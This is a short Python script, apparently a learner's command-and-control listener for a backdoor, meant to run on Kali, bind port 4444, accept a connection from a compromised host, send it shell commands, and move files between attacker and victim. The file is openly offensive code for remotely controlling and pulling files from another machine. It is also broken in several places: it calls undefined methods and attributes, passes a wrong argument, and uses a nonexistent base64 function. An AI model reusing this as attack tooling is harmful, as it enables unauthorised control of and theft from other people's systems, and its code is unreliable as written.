#!usr/bin/env python
import socket
import json
import base64
                     #to be done on kali using ide(pycharm)
class Reciever:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  # incase the connection drops the changing options would help us to reconnect back to the host
        listener.bind((ip, port))  # to bind the connection coming from the the host to our connecting port 4444
        listener.listen(0)  # to listen for the incoming connection & backlog in here is the number of connections that can be queued before the system starts refusing connections here 0 means that o connections got queued
        print("listening__connection")
        self.connect, address = listener.accept()  # it accepts the connection from thee host system
        print("got a connection from " + str(address))

    def encode_n_send(self, data):
        jdata = json.dumps(data)
        self.connect.send(jdata)

    def decode_n_recv(self):
        dataj = ""
        while True:
            try:
                dataj = dataj + self.connect.recv(1024)
                return json.loads(dataj)
            except ValueError:
                continue

    def send_recv(self, commands):
        self.encode_n_send(commands)
        commands = commands.split(" ")
        if commands[0] == "exit":
            self.connect.close()
            exit()
        return self.decode_n_recv(1024)  # 1024 is the buffer size

    def write_file(self, file, content):    #download file
        with open(file, "wb") as wfile:
            self.wfile.write(base64.b64decode(content))
            return "downloaded the file"
    
    def read_file(self, rfile):     #upload file
        with open(rfile, "rb") as file:
            return base64.b64(self.file.read())
            

    def execute(self):
        while True:
            commands = input(">>> ")
            commands = commands.split(" ")
            try:
                if commands[0] == "upload":
                    self.read_file(commands[1])
                
                result = self.send_recv(commands)
                
                if commands[0] == "download":
                    self.write_file(commands[1], result)
            except Exception:
                result = "<<<*ERROR OCCURED*>>>"
                
            print(result)

el_recieve = Reciever("10.0.2.15", 4444)
el_recieve.run()
